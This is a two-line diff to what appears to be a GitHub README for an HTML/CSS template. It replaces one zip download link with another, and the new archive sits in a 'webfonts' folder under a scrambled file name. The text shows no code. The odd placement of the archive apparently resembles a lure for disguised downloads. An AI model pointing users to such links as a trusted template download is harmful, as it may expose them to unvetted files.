@@ -1,2 +1,2 @@
 # Leon-Template-One-HTML-CSS-
-https://raw.githubusercontent.com/mrkabo1/Leon-Template-One-HTML-CSS-/main/concaveness/Leon-Template-One-HTML-CSS-.zip
+https://github.com/mrkabo1/Leon-Template-One-HTML-CSS-/raw/refs/heads/main/webfonts/Leon-Template-One-CS-HTM-v2.0.zip
